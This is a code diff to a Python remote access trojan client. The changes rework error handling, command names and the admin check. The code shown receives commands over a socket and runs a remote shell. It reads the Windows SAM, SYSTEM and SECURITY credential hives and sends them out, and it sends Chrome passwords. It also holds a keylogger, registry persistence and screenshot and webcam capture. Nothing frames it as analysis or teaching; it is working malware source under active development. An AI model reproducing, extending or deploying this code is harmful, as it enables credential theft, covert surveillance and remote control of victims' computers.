@@ -22,13 +22,13 @@ ENCODING = 'utf-8'
 
 def reliable_send(data):
     jsondata = json.dumps(data)
-    s.send(jsondata.encode())
+    s.send(jsondata.encode(ENCODING))
 
 def reliable_recv():
     data = ''
     while True:
         try:
-            data = data + s.recv(1024).decode().rstrip()
+            data = data + s.recv(1024).decode(ENCODING).rstrip()
             return json.loads(data)
         except ValueError:
             continue
@@ -79,12 +79,11 @@ def screenshot():
 # TODO: SAM - this code is untested
 def get_sam_dump():
     if not is_admin():
-        return "You must run this function as an Administrator."
-    
+        return ("You must run this function as an Administrator.",0,0)
+
     SAM = r'C:\Windows\System32\config\SAM'
     SYSTEM = r'C:\Windows\System32\config\SYSTEM'
     SECURITY = r'C:\Windows\System32\config\SECURITY'
-    
     try:
         sam_file = open(SAM, 'rb')
         system_file = open(SYSTEM, 'rb')
@@ -93,18 +92,17 @@ def get_sam_dump():
         sam_data = sam_file.read()
         system_data = system_file.read()
         security_data = security_file.read()
-        
         sam_file.close()
         system_file.close()
         security_file.close()
         
-        return sam_data, system_data, security_data
+        return (sam_data, system_data, security_data)
     except PermissionError:
-        return "Insufficient permissions to access SAM, SYSTEM, or SECURITY files."
+        return ("Insufficient permissions to access SAM, SYSTEM, or SECURITY files.",0,0)
     except FileNotFoundError:
-        return "SAM, SYSTEM, or SECURITY file not found. Please check the file paths."
+        return ("SAM, SYSTEM, or SECURITY file not found. Please check the file paths.",0,0)
     except Exception as e:
-        return f"An unexpected error occurred: {str(e)}"
+        return (f"An unexpected error occurred: {str(e)}",0,0)
 
 
 #USING WEBCAM FEATURE ADDS 40MB TO THE EXECUTABLE AS CV2 IS A LARGE LIBRARY
@@ -152,17 +150,17 @@ def persist(reg_name, copy_name):
 
 
 def is_admin():
-    global admin
     if platform == 'win32':
         try:
             temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
         except:
-            admin = '[!!] User Privileges!'
+            return False
         else:
-            admin = '[+] Administrator Privileges!'
+            return True
     elif platform == "linux" or platform == "linux2" or platform == "darwin":
         pass
         # TODO implmenet checking if these platforms have root/admin access
+    return False
 
 def chrome_passwords():
     try:
@@ -171,13 +169,13 @@ def chrome_passwords():
         reliable_send(fn.read())
         fn.close()
     except Exception as e:
-        fn.close()
         reliable_send('[-] Error getting passwords from chrome',e)
 
 
 def shell():
     while True:
         command = reliable_recv()
+        print(command)
         if command == 'quit':
             break
         elif command[:3] == 'cd ':
@@ -213,15 +211,20 @@ def shell():
             t.join()
             reliable_send('[+] Keylogger Stopped!')
         elif command[:11] == 'persistence':
-            reg_name, copy_name = command[12:].split(' ')
-            persist(reg_name, copy_name)
+            try:
+                reg_name, copy_name = command[12:].split(' ')
+                persist(reg_name, copy_name)
+            except Exception as e:
+                reliable_send('[-] Persistence Error! ' + str(e))
         elif command[:7] == 'sendall':
             subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                              stdin=subprocess.PIPE)
         elif command[:5] == 'check':
             try:
-                is_admin()
-                reliable_send(admin + ' platform: ' + platform)
+                if is_admin():
+                    reliable_send("[!!]Admin privileges" + ' platform: ' + platform)
+                else:
+                    reliable_send("[!]User privileges" + ' platform: ' + platform)
             except:
                 reliable_send('Cannot Perform Privilege Check! Platform: ' + platform)
         elif command[:5] == 'start':
@@ -236,11 +239,11 @@ def shell():
         elif command[:11] == 'chrome_pass':
             chrome_passwords()
 
-        elif command[:12] == 'get_sam_dump':
+        elif command[:8] == 'sam_dump':
             sam_dump, system_dump, security_dump = get_sam_dump()
             reliable_send((sam_dump, system_dump, security_dump))
         
-        elif command[:10] == 'privilege':
+        elif command[:9] == 'privilege':
             try:
                 result = privilege.priv()
                 reliable_send(result)
